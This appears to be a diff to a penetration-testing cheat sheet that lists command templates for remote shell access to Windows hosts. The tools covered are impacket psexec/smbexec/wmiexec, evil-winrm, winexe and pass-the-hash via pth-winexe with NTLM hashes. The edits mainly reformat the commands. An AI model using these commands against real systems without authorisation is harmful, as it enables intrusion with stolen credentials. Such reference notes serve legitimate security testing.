@@ -16,18 +16,16 @@ Note: psexec & evil-winrm uses port:5985 (powershell remote access)
 NOTE: psexec, smbexec will give SYSTEM shell. wmiexec will give user shell.
 
 ```bash
-$ python3 /opt/impacket/examples/psexec.py USER:'PASS'@IP
-$ impacket-psexec DOMAIN/USER:PASS@IP [-hashes :NTLMHASH]
-
-$ impacket-smbexec DOMAIN/USER@IP [-hashes :NTLMHASH]
-$ impacket-wmiexec DOMAIN/USER@IP [-hashes :NTLMHASH]
+impacket-psexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
+impacket-smbexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
+impacket-wmiexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
 ```
 
 ### evil-winrm
 
 ```bash
 # only USER, no DOMAIN needed
-$ evil-winrm -i IP -u <USER> [-H NT-HASH | -p PASS]
+evil-winrm -i IP -u <USER> [-H NT-HASH | -p PASS]
 
 # custom options
 PS> menu
@@ -43,15 +41,15 @@ PS> menu
 ### winexe
 
 ```bash
-$ winexe -U 'DOMAIN/USER%PASS' //IP cmd.exe
+winexe -U 'DOMAIN/USER%PASS' //IP cmd.exe
 ```
 
 ### pth-winexe
 
 ```bash
-$ pth-winexe -U 'DOMAIN/USER%HASH' //IP cmd.exe
+pth-winexe -U 'DOMAIN/USER%HASH' //IP cmd.exe
 # --system needs local admin hash
-$ pth-winexe [--system] -U 'administrator%NTLM:HASH' //IP cmd.exe
+pth-winexe [--system] -U 'administrator%NTLM:HASH' //IP cmd.exe
 ```
 
 ## PsExec.exe
